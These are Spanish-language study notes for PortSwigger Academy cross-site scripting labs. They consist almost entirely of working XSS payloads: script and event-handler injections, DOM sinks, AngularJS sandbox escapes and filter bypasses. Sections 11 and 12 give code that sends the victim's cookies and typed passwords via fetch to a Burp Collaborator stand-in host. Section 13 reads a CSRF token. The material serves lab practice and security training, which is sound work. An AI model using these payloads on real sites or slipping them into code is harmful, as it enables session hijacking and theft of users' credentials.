# 🧠 Apuntes XSS – PortSwigger Academy

---

## 🔹 1. Reflected XSS sin codificación (HTML context)

```
<script>alert("oh no")</script>
```

---

## 🔹 2. Stored XSS sin codificación (HTML context)

```
<script>alert("oh no")</script>
```

---

## 🧠 DOM-based XSS

### 🔹 3. `document.write()` usando `location.search`

```
"><script>alert(1)</script>
"><svg onload=alert(1)>
```

---

### 🔹 4. `document.write()` dentro de `<select>`

- Vulnerabilidad en `storeId`

```
?storeId="></select><img src=1 onerror=alert(1)>
```

**JS vulnerable:**

```
var store = new URLSearchParams(location.search).get('storeId');
document.write('<select name="storeId">');
if (store) {
  document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) continue;
  document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

---

### 🔹 5. innerHTML + location.search

```
<img src=1 onerror=alert(1)>
```

---

### 🔹 6. jQuery + innerHTML

```
<img src="1" onerror="alert(1)">
```

---

### 🔹 7. jQuery selector + hashchange

```
#"><img src=x onerror=alert(1)>
```

---

### 🔹 8. AngularJS expression (con `ng-app`)

```
{{constructor.constructor('alert(1)')()}}
```

---

## 🧪 Exploits prácticos

### 🔹 9. Reflected DOM XSS con JSON

```
{"searchTerm":"\"-alert(1)}//", "results":[]}
```

---

### 🔹 10. Stored DOM XSS

```
<script>alert(1)</script>
<img src=1 onerror=alert(2)>
<><img src=1 onerror=alert(2)>
```

---

### 🔹 11. Robar cookies con XSS

```
fetch('https://your-subdomain.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
```

---

### 🔹 12. Captura de contraseñas

```
<input type=password onchange="if(this.value)fetch('https://your-subdomain',{method:'POST',body:this.value})">
```

---

### 🔹 13. XSS para CSRF

```
document.querySelectorAll('input[name=csrf]')[0].value;
```

---

### 🔹 14. Reflected XSS con etiquetas/eventos limitados

Enumerar con Burp Intruder:

```
<body onresize=alert(1)>
```

---

### 🔹 15. Solo custom tags permitidas

```
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

---

### 🔹 16. XSS sin `script`, `alert`, ni `onload`

```
<svg><a><animate attributeName="href" values="javascript:alert(1)" /></a></svg>
```

---

### 🔹 17. SVG parcialmente permitido

```
<svg><animatetransform onbegin=alert(1)>
```

---

### 🔹 18. XSS en atributo `placeholder`

```
" onclick="alert(1)
```

---

### 🔹 19. Stored XSS en `href` de `<a>`

```
" onclick="alert(1)
```

---

### 🔹 20–24. Reflected XSS en `JavaScript String`

```
</script><script>alert(1)</script>
'-alert(1)-'
'+alert(1)+'
```

---

## 🔥 Avanzado

### 🔹 25. Reflected XSS en `javascript:` con caracteres bloqueados

```
'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

---

### 🔹 26. Stored XSS en `onclick` codificado

```
http://foo?&apos;-alert(1)-&apos;
```

---

### 🔹 27. Template literal + Unicode escaping

```
${ alert(1) }
```

---

### 🔹 28. AngularJS sandbox escape sin strings

```
{{constructor.constructor('alert(1)')()}}
```

Alternativa con `fromCharCode`:

```
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

---

**Referencias útiles:**
- https://portswigger.net/web-security/cross-site-scripting
- https://github.com/swisskyrepo/PayloadsAllTheThings
